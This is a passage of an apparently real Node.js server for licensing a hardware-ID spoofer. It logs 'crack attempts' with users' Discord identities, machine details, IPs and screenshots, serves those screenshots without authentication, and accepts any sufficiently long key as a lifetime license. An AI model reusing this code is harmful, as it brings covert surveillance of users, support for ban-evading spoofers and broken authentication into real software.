                return res.json({ success: false, message: 'Invalid application secret' });
            }
            
            console.log('✅ App secret validated successfully');
            
            // Handle multipart request - extract all fields including unique_id
            const { 
                attempt_number, 
                reason, 
                username, 
                machine_name, 
                timestamp, 
                os_version, 
                discord_id, 
                discord_name, 
                hwid, 
                ip_address, 
                unique_id,
                unique_log_id  // Also check for unique_log_id (backward compatibility)
            } = req.body;
            
            // Use unique_id or unique_log_id, whichever is available
            const finalUniqueId = unique_id || unique_log_id;
            console.log('Unique ID from request:', finalUniqueId);
            const screenshotFile = req.file;
            
            // ALWAYS ensure array is initialized and loaded
            if (!global.crackAttempts || !Array.isArray(global.crackAttempts)) {
                global.crackAttempts = [];
            }
            // ALWAYS reload from file to ensure we have latest data
            try {
                loadCrackLogsFromFile();
            } catch (error) {
                console.error('Error loading logs from file in multipart handler:', error);
                // Continue with in-memory data if file load fails
            }
            
            // Create log entry with unique ID to prevent duplicates
            const logEntry = {
                attempt_number: parseInt(attempt_number) || 0,
                reason: reason || 'Unknown',
                username: username || 'Unknown',
                machine_name: machine_name || 'Unknown',
                timestamp: timestamp || new Date().toISOString(),
                os_version: os_version || 'Unknown',
                discord_id: discord_id || 'Not found',
                discord_name: discord_name || 'Not found',
                hwid: hwid || 'Unknown',
                ip_address: ip_address || 'Unknown',
                unique_id: finalUniqueId || `${attempt_number}_${Date.now()}_${Math.random().toString(36).substring(7)}`,
                screenshot_filename: screenshotFile ? screenshotFile.filename : null,
                screenshot_path: screenshotFile ? screenshotFile.path : null,
                received_at: new Date().toISOString()
            };
            
            console.log('=== CRACK ATTEMPT LOG ENTRY ===');
            console.log(JSON.stringify(logEntry, null, 2));
            console.log('Screenshot file:', screenshotFile ? screenshotFile.filename : 'None');
            console.log('Unique ID:', logEntry.unique_id);
            
            // Check if this entry already exists (by unique_id or attempt_number + timestamp)
            const existingIndex = global.crackAttempts.findIndex(log => 
                log.unique_id === logEntry.unique_id || 
                (log.attempt_number === logEntry.attempt_number && log.timestamp === logEntry.timestamp && log.hwid === logEntry.hwid)
            );
            
            if (existingIndex === -1) {
                // New entry - add it
                global.crackAttempts.push(logEntry);
                console.log(`✅ NEW crack attempt logged. Total stored: ${global.crackAttempts.length}`);
            } else {
                // Entry exists - update it or skip
                console.log(`⚠️ Duplicate entry detected (unique_id: ${logEntry.unique_id}), skipping...`);
            }
            
            // Keep last 5000 entries (increased from 1000)
            if (global.crackAttempts.length > 5000) {
                // Delete old screenshot file if exists
                const oldEntry = global.crackAttempts.shift();
                if (oldEntry.screenshot_path) {
                    try {
                        if (fs.existsSync(oldEntry.screenshot_path)) {
                            fs.unlinkSync(oldEntry.screenshot_path);
                        }
                    } catch (e) {
                        console.error('Error deleting old screenshot:', e);
                    }
                }
            }
            
            // Save to file immediately
            saveCrackLogsToFile();
            
            console.log('=== END CRACK ATTEMPT LOG ===');
            
            res.json({
                success: true,
                message: 'Crack attempt logged successfully',
                log_entry: logEntry,
                total_logs: global.crackAttempts.length
            });
        });
    } else {
        // Handle JSON request - use normal middleware
        console.log('Processing as JSON request');
        next();
    }
}, validateAppSecret, (req, res) => {
    // JSON fallback
    console.log('Calling handleJsonCrackAttempt');
    handleJsonCrackAttempt(req, res);
});

// Handle JSON-only crack attempt (fallback)
function handleJsonCrackAttempt(req, res) {
    console.log('=== HANDLING JSON CRACK ATTEMPT ===');
    console.log('Request body:', JSON.stringify(req.body, null, 2));
    console.log('Request IP:', req.ip || req.connection.remoteAddress || 'Unknown');
    console.log('App secret in body:', req.body.app_secret ? `Present (${req.body.app_secret.length} chars)` : 'Missing');
    console.log('App secret matches:', req.body.app_secret === APP_SECRET);
    
    const { 
        attempt_number, 
        reason, 
        username, 
        machine_name, 
        timestamp, 
        os_version, 
        discord_id, 
        discord_name, 
        hwid, 
        ip_address, 
        unique_id,
        unique_log_id,  // Also check for unique_log_id (backward compatibility)
        screenshot_base64 
    } = req.body;
    
    // Use unique_id or unique_log_id, whichever is available
    const finalUniqueId = unique_id || unique_log_id;
    console.log('Unique ID from JSON request:', finalUniqueId);
    
    // ALWAYS ensure array is initialized and loaded
    if (!global.crackAttempts || !Array.isArray(global.crackAttempts)) {
        global.crackAttempts = [];
    }
    // ALWAYS reload from file to ensure we have latest data
    try {
        loadCrackLogsFromFile();
    } catch (error) {
        console.error('Error loading logs from file in JSON handler:', error);
        // Continue with in-memory data if file load fails
    }
    
    // Get IP from request if not provided
    const finalIPAddress = ip_address || req.ip || req.connection.remoteAddress || 'Unknown';
    
    // Create log entry with unique ID
    const logEntry = {
        attempt_number: parseInt(attempt_number) || 0,
        reason: reason || 'Unknown',
        username: username || 'Unknown',
        machine_name: machine_name || 'Unknown',
        timestamp: timestamp || new Date().toISOString(),
        os_version: os_version || 'Unknown',
        discord_id: discord_id || 'Not found',
        discord_name: discord_name || 'Not found',
        hwid: hwid || 'Unknown',
        ip_address: finalIPAddress,
        unique_id: finalUniqueId || `${attempt_number}_${Date.now()}_${Math.random().toString(36).substring(7)}`,
        screenshot_filename: null,
        screenshot_path: null,
        screenshot_base64: screenshot_base64 || null,
        received_at: new Date().toISOString()
    };
    
    console.log('=== CRACK ATTEMPT LOG ENTRY (JSON) ===');
    console.log(JSON.stringify(logEntry, null, 2));
    console.log('Unique ID:', logEntry.unique_id);
    
    // Check if this entry already exists
    const existingIndex = global.crackAttempts.findIndex(log => 
        log.unique_id === logEntry.unique_id || 
        (log.attempt_number === logEntry.attempt_number && log.timestamp === logEntry.timestamp && log.hwid === logEntry.hwid)
    );
    
    if (existingIndex === -1) {
        // New entry - add it
        global.crackAttempts.push(logEntry);
        console.log(`✅ NEW crack attempt logged (JSON). Total stored: ${global.crackAttempts.length}`);
    } else {
        // Entry exists - update it or skip
        console.log(`⚠️ Duplicate entry detected (unique_id: ${logEntry.unique_id}), skipping...`);
    }
    
    // Keep last 5000 entries
    if (global.crackAttempts.length > 5000) {
        const oldEntry = global.crackAttempts.shift(); // Remove oldest entry
        if (oldEntry.screenshot_path) {
            try {
                if (fs.existsSync(oldEntry.screenshot_path)) {
                    fs.unlinkSync(oldEntry.screenshot_path);
                }
            } catch (e) {
                console.error('Error deleting old screenshot:', e);
            }
        }
    }
    
    // Save to file immediately
    saveCrackLogsToFile();
    
    console.log('=== END CRACK ATTEMPT LOG ===');
    
    res.json({
        success: true,
        message: 'Crack attempt logged successfully',
        log_entry: logEntry,
        total_logs: global.crackAttempts.length
    });
}

// Test endpoint to verify server is working
app.get('/auth/test', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Server is running',
        timestamp: new Date().toISOString(),
        crackAttemptsCount: global.crackAttempts ? global.crackAttempts.length : 0
    });
});

// Get crack attempt logs (Admin only)
app.post('/auth/get-crack-logs', validateAppSecret, (req, res) => {
    const { limit = 100 } = req.body;
    
    // ALWAYS ensure array is initialized
    if (!global.crackAttempts || !Array.isArray(global.crackAttempts)) {
        global.crackAttempts = [];
        console.log('Initialized global.crackAttempts array in get-crack-logs');
    }
    
    // ALWAYS reload from file to ensure we have latest data
    try {
    loadCrackLogsFromFile();
    } catch (error) {
        console.error('Error loading logs from file in get-crack-logs:', error);
        // Continue with in-memory data if file load fails
    }
    
    console.log(`=== GET CRACK LOGS REQUEST ===`);
    console.log(`Total stored: ${global.crackAttempts.length}, Requesting: ${limit}`);
    if (global.crackAttempts.length > 0) {
    console.log('First 3 entries:', global.crackAttempts.slice(0, 3).map(e => ({ 
        attempt: e.attempt_number, 
        reason: e.reason, 
        timestamp: e.timestamp,
        unique_id: e.unique_id 
    })));
    } else {
        console.log('No logs found in memory or file');
    }
    
    // Sort by received_at (most recent first) and return
    const sortedLogs = [...global.crackAttempts].sort((a, b) => {
        const timeA = new Date(a.received_at || a.timestamp || 0).getTime();
        const timeB = new Date(b.received_at || b.timestamp || 0).getTime();
        return timeB - timeA; // Descending order (newest first)
    });
    
    // Return most recent entries with screenshot URLs
    const logs = sortedLogs.slice(0, limit).map(log => {
        const logCopy = { ...log };
        if (log.screenshot_filename) {
            // Generate URL to access screenshot
            logCopy.screenshot_url = `/auth/get-screenshot/${log.screenshot_filename}`;
        }
        // Remove screenshot_base64 from response (too large)
        delete logCopy.screenshot_base64;
        return logCopy;
    });
    
    console.log(`Returning ${logs.length} logs (sorted by most recent)`);
    
    res.json({
        success: true,
        total: global.crackAttempts.length,
        logs: logs
    });
});

// Get screenshot file (Admin only) - no auth needed for GET (or add auth if preferred)
app.get('/auth/get-screenshot/:filename', (req, res) => {
    const filename = req.params.filename;
    // Sanitize filename to prevent directory traversal
    const safeFilename = path.basename(filename);
    if (!uploadDir) {
        return res.status(503).json({ success: false, message: 'File uploads not available' });
    }
    
    const filepath = path.join(uploadDir, safeFilename);
    
    try {
        if (fs.existsSync(filepath)) {
            res.sendFile(path.resolve(filepath));
        } else {
            console.error('Screenshot not found:', filepath);
            res.status(404).json({ success: false, message: 'Screenshot not found' });
        }
    } catch (error) {
        console.error('Error serving screenshot:', error);
        res.status(500).json({ success: false, message: 'Error serving screenshot' });
    }
});

// Debug endpoint to check if server is receiving data
app.post('/auth/test-crack-log', (req, res) => {
    console.log('Test endpoint called');
    console.log('Headers:', req.headers);
    console.log('Body:', req.body);
    console.log('Files:', req.files);
    res.json({ 
        success: true, 
        message: 'Test endpoint working',
        received: {
            headers: req.headers,
            body: req.body,
            files: req.files
        }
    });
});

// ========================================
// ECDH KEY EXCHANGE SYSTEM (v3.0)
// For Perfect Forward Secrecy
// ========================================

// Store active key exchange sessions
const keyExchangeSessions = new Map();

// Generate server ECDH key pair
function generateServerKeyPair() {
    const ecdh = crypto.createECDH('prime256v1');
    ecdh.generateKeys();
    return ecdh;
}

// Key exchange endpoint
app.post('/auth/key-exchange', (req, res) => {
    try {
        const { public_key, timestamp } = req.body;
        
        // Validate timestamp (prevent replay)
        const now = Date.now();
        if (Math.abs(now - timestamp) > 60000) {
            return res.status(400).json({
                success: false,
                message: 'Request expired'
            });
        }
        
        // Decode client's public key
        const clientPubKey = Buffer.from(public_key, 'base64');
        
        // Generate server key pair
        const serverECDH = generateServerKeyPair();
        const serverPubKey = serverECDH.getPublicKey('base64');
        
        // Derive shared secret
        const sharedSecret = serverECDH.computeSecret(clientPubKey);
        
        // Generate session token
        const sessionToken = crypto.randomBytes(32).toString('hex');
        
        // Store session with derived key
        keyExchangeSessions.set(sessionToken, {
            sharedSecret: sharedSecret,
            createdAt: Date.now(),
            lastActivity: Date.now()
        });
        
        // Cleanup old sessions (older than 30 minutes)
        for (const [token, session] of keyExchangeSessions) {
            if (Date.now() - session.lastActivity > 1800000) {
                keyExchangeSessions.delete(token);
            }
        }
        
        console.log(`🔐 Key exchange successful. Session: ${sessionToken.substring(0, 16)}...`);
        
        res.json({
            success: true,
            server_public_key: serverPubKey,
            session_token: sessionToken
        });
        
    } catch (error) {
        console.error('Key exchange error:', error);
        res.status(500).json({
            success: false,
            message: 'Key exchange failed'
        });
    }
});

// ========================================
// ENCRYPTED REQUEST HANDLER (PFS)
// Decrypt requests encrypted with session key
// ========================================

function decryptPFSRequest(encryptedData, sessionToken) {
    try {
        const session = keyExchangeSessions.get(sessionToken);
        if (!session) return null;
        
        // Update last activity
        session.lastActivity = Date.now();
        
        // Derive encryption key from shared secret
        const key = crypto.createHash('sha256').update(session.sharedSecret).digest();
        
        // Decrypt
        const iv = Buffer.from(encryptedData.iv, 'base64');
        const tag = Buffer.from(encryptedData.tag, 'base64');
        const ciphertext = Buffer.from(encryptedData.data, 'base64');
        
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);
        
        let decrypted = decipher.update(ciphertext, null, 'utf8');
        decrypted += decipher.final('utf8');
        
        return JSON.parse(decrypted);
    } catch (error) {
        console.error('PFS Decryption error:', error);
        return null;
    }
}

function encryptPFSResponse(data, sessionToken) {
    try {
        const session = keyExchangeSessions.get(sessionToken);
        if (!session) return data;
        
        // Derive encryption key from shared secret
        const key = crypto.createHash('sha256').update(session.sharedSecret).digest();
        
        // Generate IV
        const iv = crypto.randomBytes(12);
        
        // Encrypt
        const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8');
        encrypted = Buffer.concat([encrypted, cipher.final()]);
        
        const tag = cipher.getAuthTag();
        
        return {
            encrypted: true,
            pfs: true,
            data: encrypted.toString('base64'),
            iv: iv.toString('base64'),
            tag: tag.toString('base64')
        };
    } catch (error) {
        console.error('PFS Encryption error:', error);
        return data;
    }
}

// Middleware to handle PFS encrypted requests
app.use('/auth/*', (req, res, next) => {
    if (req.body && req.body.encrypted === true && req.body.pfs === true && req.body.session_token) {
        const decrypted = decryptPFSRequest(req.body, req.body.session_token);
        if (decrypted) {
            req.decryptedBody = decrypted;
            req.pfsSessionToken = req.body.session_token;
        }
    }
    next();
});

// ========================================
// SERVER-SIDE DECRYPTION KEY ENDPOINT
// Provides keys to decrypt protected features
// ========================================

// Encrypted code blocks (register your protected code blocks here)
const encryptedCodeBlocks = new Map();

// Register an encrypted code block
function registerCodeBlock(blockId) {
    // Generate unique key for this block
    const key = crypto.randomBytes(32);
    const iv = crypto.randomBytes(12);
    
    encryptedCodeBlocks.set(blockId, {
        key: key,
        iv: iv,
        registeredAt: Date.now()
    });
    
    console.log(`📦 Registered code block: ${blockId}`);
}

// Initialize protected code blocks
registerCodeBlock('spoof_core');
registerCodeBlock('license_check');
registerCodeBlock('feature_unlock');
registerCodeBlock('hwid_spoof');
registerCodeBlock('auth_validation');

// Get decryption key for code block
app.post('/auth/decrypt-block', (req, res) => {
    try {
        // Use decrypted body if available
        const body = req.decryptedBody || req.body;
        const { block_id, license_key, hwid, session_token, app_secret } = body;
        
        // Verify app secret
        if (app_secret !== APP_SECRET) {
            return res.status(401).json({
                success: false,
                message: 'Invalid app secret'
            });
        }
        
        // Validate license (check if exists and valid)
        const licenseHash = crypto.createHash('sha256').update(license_key).digest('hex');
        let licenseValid = false;
        
        // Check active sessions
        for (const [hash, session] of activeSessions) {
            if (session.license_key === license_key && session.hwid === hwid) {
                licenseValid = true;
                break;
            }
        }
        
        if (!licenseValid) {
            return res.status(401).json({
                success: false,
                message: 'Invalid license or session'
            });
        }
        
        // Get the code block
        const block = encryptedCodeBlocks.get(block_id);
        if (!block) {
            return res.status(404).json({
                success: false,
                message: 'Code block not found'
            });
        }
        
        // Return the decryption key
        const response = {
            success: true,
            key: block.key.toString('base64'),
            iv: block.iv.toString('base64'),
            block_id: block_id
        };
        
        // Encrypt response with PFS if available
        if (req.pfsSessionToken) {
            res.json(encryptPFSResponse(response, req.pfsSessionToken));
        } else {
            res.json(response);
        }
        
    } catch (error) {
        console.error('Decrypt block error:', error);
        res.status(500).json({
            success: false,
            message: 'Decryption failed'
        });
    }
});

// ========================================
// ENHANCED LICENSE VALIDATION (v3.0)
// With server-side token generation for unpatchable auth
// ========================================

app.post('/auth/license-enhanced', (req, res) => {
    try {
        // Rate limiting
        const rateLimit = checkRateLimit(req);
        if (!rateLimit.allowed) {
            return res.status(429).json({
                success: false,
                message: rateLimit.reason,
                retry_after: rateLimit.retryAfter
            });
        }
        
        // Use decrypted body if available
        const body = req.decryptedBody || req.body;
        const { license_key, hwid, app_secret, timestamp, nonce } = body;
        
        // Validate app secret
        if (app_secret !== APP_SECRET) {
            recordFailedAttempt(req, 'Invalid app secret (enhanced)');
            return res.status(401).json({
                success: false,
                message: 'Invalid application secret'
            });
        }
        
        // Validate license
        if (!license_key || license_key.length < 10) {
            recordFailedAttempt(req, 'Invalid license format (enhanced)');
            return res.status(400).json({
                success: false,
                message: 'Invalid license format'
            });
        }
        
        // Generate server token for unpatchable auth
        const serverToken = crypto.randomBytes(64);
        const sessionHash = crypto.createHash('sha256')
            .update(license_key + hwid + Date.now().toString())
            .digest('hex');
        
        // Store the token for verification
        activeSessions.set(sessionHash, {
            token: serverToken,
            license_key: license_key,
            hwid: hwid,
            createdAt: Date.now(),
            lastActivity: Date.now()
        });
        
        console.log(`✅ Enhanced license validated. Session: ${sessionHash.substring(0, 16)}...`);
        
        const response = {
            success: true,
            message: 'License validated',
            session_token: serverToken.toString('base64'),
            session_hash: sessionHash,
            expiry: 'LIFETIME',
            features: ['spoof_core', 'license_check', 'feature_unlock', 'hwid_spoof', 'auth_validation'],
            watermark_hash: crypto.createHash('sha256').update(license_key + Date.now().toString()).digest('hex').substring(0, 16)
        };
        
        // Encrypt response if PFS session exists
        if (req.pfsSessionToken) {
            res.json(encryptPFSResponse(response, req.pfsSessionToken));
        } else {
            res.json(response);
        }
        
    } catch (error) {
        console.error('Enhanced license validation error:', error);
        res.status(500).json({
            success: false,
            message: 'Validation failed'
        });
    }
});

// ========================================
// SECURE HEARTBEAT WITH TOKEN VERIFICATION
// ========================================

app.post('/auth/heartbeat-secure', (req, res) => {
    try {
        const body = req.decryptedBody || req.body;
        const { session_hash, verification_token, timestamp, app_secret } = body;
        
        // Validate app secret
        if (app_secret !== APP_SECRET) {
            return res.status(401).json({
                success: false,
                message: 'Invalid app secret'
            });
        }
        
        // Validate timestamp
        if (Math.abs(Date.now() - timestamp) > 30000) {
            return res.status(400).json({
                success: false,
                message: 'Request expired'
            });
        }
        
        // Validate session
        const session = activeSessions.get(session_hash);
        if (!session) {
            return res.status(401).json({
                success: false,
                message: 'Invalid session'
            });
        }
        
        // Update activity
        session.lastActivity = Date.now();
        
        // Generate new verification token
        const newToken = crypto.randomBytes(32).toString('hex');
        session.verificationToken = newToken;
        
        const response = {
            success: true,
            next_token: newToken,
            server_time: Date.now(),
            session_valid: true
        };
        
        if (req.pfsSessionToken) {
            res.json(encryptPFSResponse(response, req.pfsSessionToken));
        } else {
            res.json(response);
        }
        
    } catch (error) {
        console.error('Secure heartbeat error:', error);
        res.status(500).json({
            success: false,
            message: 'Heartbeat failed'
        });
    }
});

// ========================================
// LICENSE WATERMARK VERIFICATION
// For tracking leaked copies
// ========================================

app.post('/auth/verify-watermark', (req, res) => {
    try {
        const body = req.decryptedBody || req.body;
        const { watermark_hash, license_key, hwid, app_secret } = body;
        
        // Validate app secret
        if (app_secret !== APP_SECRET) {
            return res.status(401).json({
                success: false,
                message: 'Invalid app secret'
            });
        }
        
        // Verify watermark against known licenses
        // In production, this would check a database
        console.log(`📎 Watermark verification request: ${watermark_hash} from ${hwid}`);
        
        res.json({
            success: true,
            valid: true,
            message: 'Watermark verified'
        });
        
    } catch (error) {
        console.error('Watermark verification error:', error);
        res.status(500).json({
            success: false,
            message: 'Verification failed'
        });
    }
});

// ========================================
// ADMIN CONTROL ENDPOINTS (NEW)
// ========================================

// State variables for admin controls
let lockdownMode = false;
let authEnabled = true;
let websiteLocked = false;

// Get all status
app.post('/auth/admin/get-all-status', validateAppSecret, (req, res) => {
    res.json({
        success: true,
        lockdown: lockdownMode,
        auth_enabled: authEnabled,
        website_locked: websiteLocked,
        maintenance: maintenanceMode,
        server_enabled: !serverDisabled,
        loader_enabled: !loaderDisabled
    });
});

// Lockdown mode
app.post('/auth/admin/lockdown', validateAppSecret, (req, res) => {
    const { enabled } = req.body;
    lockdownMode = !!enabled;
    console.log(`🔒 Lockdown mode ${lockdownMode ? 'ACTIVATED' : 'deactivated'}`);
    res.json({ success: true, lockdown: lockdownMode });
});

// Auth control
app.post('/auth/admin/set-auth-status', validateAppSecret, (req, res) => {
    const { enabled } = req.body;
    authEnabled = enabled !== false;
    console.log(`🔐 Authentication ${authEnabled ? 'enabled' : 'disabled'}`);
    res.json({ success: true, auth_enabled: authEnabled });
});

// Website lock
app.post('/auth/admin/set-website-lock', validateAppSecret, (req, res) => {
    const { locked } = req.body;
    websiteLocked = !!locked;
    console.log(`🌐 Website ${websiteLocked ? 'locked' : 'unlocked'}`);
    res.json({ success: true, website_locked: websiteLocked });
});

// Maintenance mode
app.post('/auth/admin/set-maintenance', validateAppSecret, (req, res) => {
    const { enabled } = req.body;
    maintenanceMode = !!enabled;
    console.log(`🔧 Maintenance mode ${maintenanceMode ? 'enabled' : 'disabled'}`);
    res.json({ success: true, maintenance: maintenanceMode });
});

// Server status
app.post('/auth/admin/set-server-status', validateAppSecret, (req, res) => {
    const { enabled } = req.body;
    serverDisabled = !enabled;
    console.log(`🖥️ Server ${serverDisabled ? 'disabled' : 'enabled'}`);
    res.json({ success: true, server_enabled: !serverDisabled });
});

// Bulk key generation
app.post('/auth/admin/bulk-generate-keys', validateAppSecret, (req, res) => {
    const count = Math.min(parseInt(req.body.count) || 5, 50);
    const keys = [];
    
    for (let i = 0; i < count; i++) {
        const key = 'LW-' + crypto.randomBytes(4).toString('hex').toUpperCase() + 
                    '-' + crypto.randomBytes(4).toString('hex').toUpperCase() +
                    '-' + crypto.randomBytes(4).toString('hex').toUpperCase();
        validLicenseKeys.add(key);
        keys.push(key);
    }
    
    console.log(`🔑 Generated ${keys.length} license keys`);
    res.json({ success: true, keys, count: keys.length });
});

// Ban IP
app.post('/auth/admin/ban-ip', validateAppSecret, (req, res) => {
    const { ip } = req.body;
    if (!ip) return res.status(400).json({ success: false, message: 'IP required' });
    
    bannedIPs.add(ip);
    console.log(`🚫 IP banned: ${ip}`);
    res.json({ success: true, message: 'IP banned', ip });
});

// Unban IP
app.post('/auth/admin/unban-ip', validateAppSecret, (req, res) => {
    const { ip } = req.body;
    if (!ip) return res.status(400).json({ success: false, message: 'IP required' });
    
    bannedIPs.delete(ip);
    // Also clear from rate limit store
    rateLimitStore.delete(ip);
    failedAttempts.delete(ip);
    
    console.log(`✅ IP unbanned: ${ip}`);
    res.json({ success: true, message: 'IP unbanned', ip });
});

// Ban HWID
app.post('/auth/admin/ban-hwid', validateAppSecret, (req, res) => {
    const { hwid } = req.body;
    if (!hwid) return res.status(400).json({ success: false, message: 'HWID required' });
    
    bannedHWIDs.add(hwid);
    console.log(`🚫 HWID banned: ${hwid.substring(0, 20)}...`);
    res.json({ success: true, message: 'HWID banned' });
});

// Unban HWID
app.post('/auth/admin/unban-hwid', validateAppSecret, (req, res) => {
    const { hwid } = req.body;
    if (!hwid) return res.status(400).json({ success: false, message: 'HWID required' });
    
    bannedHWIDs.delete(hwid);
    console.log(`✅ HWID unbanned: ${hwid.substring(0, 20)}...`);
    res.json({ success: true, message: 'HWID unbanned' });
});

// List all bans
app.post('/auth/admin/list-bans', validateAppSecret, (req, res) => {
    res.json({
        success: true,
        banned_ips: Array.from(bannedIPs),
        banned_hwids: Array.from(bannedHWIDs)
    });
});

// Clear all bans
app.post('/auth/admin/clear-all-bans', validateAppSecret, (req, res) => {
    const ipCount = bannedIPs.size;
    const hwidCount = bannedHWIDs.size;
    
    bannedIPs.clear();
    bannedHWIDs.clear();
    rateLimitStore.clear();
    failedAttempts.clear();
    
    console.log(`🧹 Cleared ${ipCount} IP bans and ${hwidCount} HWID bans`);
    res.json({ 
        success: true, 
        message: 'All bans cleared',
        cleared_ips: ipCount,
        cleared_hwids: hwidCount
    });
});

// Whitelist key
const whitelistedKeys = new Set();
app.post('/auth/admin/whitelist-key', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    if (!license_key) return res.status(400).json({ success: false, message: 'Key required' });
    
    whitelistedKeys.add(license_key);
    console.log(`⭐ Key whitelisted: ${license_key}`);
    res.json({ success: true, message: 'Key whitelisted' });
});

// Security stats
app.post('/auth/admin/security-stats', validateAppSecret, (req, res) => {
    res.json({
        success: true,
        banned_ips: bannedIPs.size,
        banned_hwids: bannedHWIDs.size,
        whitelisted_keys: whitelistedKeys.size,
        active_sessions: activeSessions.size,
        rate_limited: rateLimitStore.size,
        failed_attempts_tracked: failedAttempts.size
    });
});

// Rotate owner key
app.post('/auth/admin/rotate-owner-key', validateAppSecret, (req, res) => {
    ownerKeyData = generateOwnerKey();
    console.log(`🔄 Owner key rotated manually`);
    res.json({
        success: true,
        owner_key: ownerKeyData.key,
        generated_at: ownerKeyData.generatedAt,
        next_rotation: ownerKeyData.nextRotation
    });
});

// Clear logs
app.post('/auth/admin/clear-logs', validateAppSecret, (req, res) => {
    const count = crackAttemptLogs.length;
    crackAttemptLogs.length = 0;
    console.log(`🧹 Cleared ${count} crack attempt logs`);
    res.json({ success: true, cleared: count });
});

// Revoke all sessions
app.post('/auth/admin/revoke-all-sessions', validateAppSecret, (req, res) => {
    const count = activeSessions.size;
    activeSessions.clear();
    console.log(`🚪 Revoked ${count} active sessions`);
    res.json({ success: true, count });
});

// Reset rate limits
app.post('/auth/admin/reset-rate-limits', validateAppSecret, (req, res) => {
    const rlCount = rateLimitStore.size;
    const faCount = failedAttempts.size;
    
    rateLimitStore.clear();
    failedAttempts.clear();
    
    console.log(`🔄 Reset ${rlCount} rate limits and ${faCount} failed attempt records`);
    res.json({ 
        success: true, 
        message: 'Rate limits cleared',
        rate_limits_cleared: rlCount,
        failed_attempts_cleared: faCount
    });
});

// Search user
app.post('/auth/admin/search-user', validateAppSecret, (req, res) => {
    const { query } = req.body;
    if (!query) return res.status(400).json({ success: false, message: 'Query required' });
    
    // Search in license keys, HWIDs, user data
    let found = null;
    
    // Check if it's a license key
    if (validLicenseKeys.has(query)) {
        const session = Array.from(activeSessions.values()).find(s => s.license === query);
        found = {
            license_key: query,
            hwid: session?.hwid || null,
            ip: session?.ip || null,
            status: 'Active',
            last_login: session?.lastActivity || null
        };
    }
    
    // Search in sessions by HWID or IP
    if (!found) {
        for (const [token, session] of activeSessions) {
            if (session.hwid === query || session.ip === query || session.license === query) {
                found = {
                    license_key: session.license,
                    hwid: session.hwid,
                    ip: session.ip,
                    status: 'Active',
                    last_login: session.lastActivity
                };
                break;
            }
        }
    }
    
    if (found) {
        res.json({ success: true, user: found });
    } else {
        res.json({ success: false, message: 'User not found' });
    }
});

// List all keys
app.post('/auth/admin/list-keys', validateAppSecret, (req, res) => {
    const keysList = Object.keys(licenses).map(key => {
        const license = licenses[key];
        // Determine status based on used and valid fields
        let status = 'Unknown';
        if (license.valid && license.used) {
            status = 'Active';
        } else if (license.valid && !license.used) {
            status = 'Valid';
        } else if (!license.valid) {
            status = 'Invalid';
        }
        return {
            key: key,
            valid: license.valid,
            activated: license.activated !== false, // Backward compatible - default to true if field doesn't exist
            used: license.used,
            status: status,
            hwid: license.hwid || null,
            ip: license.ip || null,
            expiry: license.expiry,
            activated_at: license.activated_at || null,
            activation_ip: license.activation_ip || null,
            first_used: license.first_used || null,
            last_used: license.last_used || null
        };
    });
    
    res.json({ success: true, keys: keysList, count: keysList.length });
});

// Revoke key
app.post('/auth/admin/revoke-key', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    if (!license_key) return res.status(400).json({ success: false, message: 'Key required' });
    
    const existed = validLicenseKeys.delete(license_key);
    
    // Also remove from sessions
    for (const [token, session] of activeSessions) {
        if (session.license === license_key) {
            activeSessions.delete(token);
        }
    }
    
    if (existed) {
        console.log(`❌ Key revoked: ${license_key}`);
        res.json({ success: true, message: 'Key revoked' });
    } else {
        res.json({ success: false, message: 'Key not found' });
    }
});

// Reset key HWID
const keyHWIDLocks = new Map();
app.post('/auth/admin/reset-hwid', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    if (!license_key) return res.status(400).json({ success: false, message: 'Key required' });
    
    keyHWIDLocks.delete(license_key);
    console.log(`🔄 HWID reset for key: ${license_key}`);
    res.json({ success: true, message: 'HWID reset' });
});

// Extend key
const keyExpirations = new Map();
app.post('/auth/admin/extend-key', validateAppSecret, (req, res) => {
    const { license_key, days } = req.body;
    if (!license_key) return res.status(400).json({ success: false, message: 'Key required' });
    
    const currentExpiry = keyExpirations.get(license_key) || Date.now();
    const newExpiry = currentExpiry + (days * 24 * 60 * 60 * 1000);
    keyExpirations.set(license_key, newExpiry);
    
    console.log(`📅 Extended ${license_key} by ${days} days`);
    res.json({ 
        success: true, 
        message: `Extended by ${days} days`,
        new_expiry: new Date(newExpiry).toISOString()
    });
});

// Send message to user
const pendingMessages = new Map();
app.post('/auth/admin/send-message', validateAppSecret, (req, res) => {
    const { license_key, message } = req.body;
    if (!license_key || !message) return res.status(400).json({ success: false, message: 'Key and message required' });
    
    if (!pendingMessages.has(license_key)) {
        pendingMessages.set(license_key, []);
    }
    pendingMessages.get(license_key).push({
        message,
        timestamp: Date.now()
    });
    
    console.log(`📨 Message queued for ${license_key}: ${message.substring(0, 50)}...`);
    res.json({ success: true, message: 'Message queued' });
});

// Get pending messages for a user (called by client)
app.post('/auth/get-messages', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    if (!license_key) return res.status(400).json({ success: false, message: 'Key required' });
    
    const messages = pendingMessages.get(license_key) || [];
    pendingMessages.delete(license_key); // Clear after retrieval
    
    res.json({ success: true, messages });
});

// Ban user (by identifier - key, HWID, or IP)
app.post('/auth/admin/ban-user', validateAppSecret, (req, res) => {
    const { identifier } = req.body;
    if (!identifier) return res.status(400).json({ success: false, message: 'Identifier required' });
    
    // Determine type and ban appropriately
    if (identifier.includes('.')) {
        // Looks like IP
        bannedIPs.add(identifier);
        console.log(`🚫 Banned IP: ${identifier}`);
    } else if (identifier.startsWith('LW-') || identifier.includes('-')) {
        // Looks like license key - find associated HWID
        for (const [token, session] of activeSessions) {
            if (session.license === identifier) {
                if (session.hwid) bannedHWIDs.add(session.hwid);
                if (session.ip) bannedIPs.add(session.ip);
                activeSessions.delete(token);
            }
        }
        validLicenseKeys.delete(identifier);
        console.log(`🚫 Banned license: ${identifier}`);
    } else {
        // Assume HWID
        bannedHWIDs.add(identifier);
        console.log(`🚫 Banned HWID: ${identifier.substring(0, 20)}...`);
    }
    
    res.json({ success: true, message: 'User banned' });
});

// Get app info (stats)
app.post('/auth/admin/get-app-info', validateAppSecret, (req, res) => {
    res.json({
        success: true,
        total_users: validLicenseKeys.size,
        total_keys: validLicenseKeys.size,
        online_users: activeSessions.size,
